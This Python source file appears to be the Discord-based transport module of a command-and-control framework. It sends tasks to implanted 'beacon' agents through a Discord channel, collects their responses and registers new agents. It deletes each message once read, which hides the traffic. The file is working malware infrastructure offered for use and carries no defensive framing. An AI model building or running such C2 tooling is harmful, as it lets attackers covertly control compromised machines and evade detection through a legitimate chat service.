import discord
import os
import asyncio
from time import sleep  # Importing sleep from time module
import uuid
from discord_server import client

# Global client object for Discord

# Channel where tasks and responses are communicated
COMMAND_CHANNEL_ID = int(os.getenv('COMMAND_CHANNEL_ID')) # Replace with your command channel ID
TASK_PREFIX = 'TaskForYou'
RESP_PREFIX = 'RespForYou'


def prepTransport():
    """
    Prepares the transport for communication. For Discord, no specific preparation is needed.
    """
    return 0


async def sendData(data, beaconId):
    """
    Sends data (task) to the beacon (agent) via a Discord message.
    """
    keyName = "{}:{}:{}".format(beaconId, TASK_PREFIX, str(uuid.uuid4()))
    channel = client.get_channel(COMMAND_CHANNEL_ID)
    if channel:
        await channel.send(f"{keyName}:{data}")
    else:
        print(f"Error: Could not find command channel {COMMAND_CHANNEL_ID}")


async def retrieveData(beaconId):
    """
    Retrieves data (response) from the beacon via Discord messages.
    """
    keyName = "{}:{}".format(beaconId, RESP_PREFIX)
    channel = client.get_channel(COMMAND_CHANNEL_ID)
    if channel:
        taskResponses = []
        async for message in channel.history(limit=100):  # Adjust the limit based on need
            if message.content.startswith(f"{keyName}:"):
                response = message.content.split(f"{keyName}:")[1]
                taskResponses.append(response)
                await message.delete()  # Delete the message after retrieving
        return taskResponses
    else:
        print(f"Error: Could not find command channel {COMMAND_CHANNEL_ID}")
        return []


async def fetchNewBeacons():
    """
    Fetches new beacons that have registered to the Discord channel via messages starting with "AGENT:".
    
    Returns:
        list - List of beacon IDs that need to be handled.
    """
    beacons = []
    channel = client.get_channel(COMMAND_CHANNEL_ID)
    if channel:
        async for message in channel.history(limit=2):  # Adjust the limit based on need
            if message.content.startswith("[+] Registering new agent AGENT:"):
                beaconId = message.content.split("[+] Registering new agent AGENT:")[1]
                print(f"[+] Discovered new Agent in channel: {beaconId}")
                beacons.append(beaconId)
                await message.delete()  # Delete the message after detecting the beacon
        if beacons:
            print(f"[+] Returning {len(beacons)} beacons for first-time setup.")
        return beacons
    else:
        print(f"Error: Could not find command channel {COMMAND_CHANNEL_ID}")
        return []



# For usage in the main server script, you would initialize the client like this:
# init_discord_client('YOUR_DISCORD_BOT_TOKEN')